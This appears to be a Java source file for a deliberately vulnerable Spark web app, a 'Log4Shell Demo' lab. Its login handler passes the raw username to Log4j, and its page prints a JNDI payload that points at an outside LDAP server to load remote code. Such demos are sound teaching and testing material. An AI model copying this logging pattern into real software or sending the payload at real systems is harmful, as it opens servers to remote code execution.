package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import static spark.Spark.*;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) {
        port(8080);

        get("/", (req, res) -> {
            return "<html><body>" +
                "<h1>Log4Shell Demo</h1>" +
                "<form method='POST' action='/login'>" +
                "<input name='username' placeholder='Username'><br>" +
                "<input name='password' type='password' placeholder='Password'><br>" +
                "<button>Login</button>" +
                "</form>" +
                "<h3>Payload:</h3>" +
                "<code>${jndi:ldap://ldap-server:1389/Exploit}</code>" +
                "</body></html>";
        });

        post("/login", (req, res) -> {
            String user = req.queryParams("username");
            
            // VULNERABLE: Direct string concatenation
            logger.info("Login attempt for user: " + user);
            
            return "Logged attempt for: " + user;
        });

        logger.info("Server started on 8080");
    }
}